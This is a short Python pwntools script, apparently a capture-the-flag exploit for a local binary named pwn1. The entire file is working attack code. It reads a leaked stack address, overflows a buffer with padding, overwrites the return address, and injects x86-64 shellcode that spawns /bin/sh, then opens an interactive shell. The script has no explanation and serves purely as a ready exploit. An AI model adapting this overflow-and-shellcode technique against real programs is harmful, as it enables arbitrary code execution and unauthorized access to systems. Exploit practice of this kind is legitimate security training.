from pwn import *

proc = process('/home/knight/ctf/exploit/pwn1')
addr = int(proc.recvuntil('\n'), 16)
payload = 'a'*0x18
payload += p64(addr+32)
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
proc.sendline(payload)
proc.interactive()
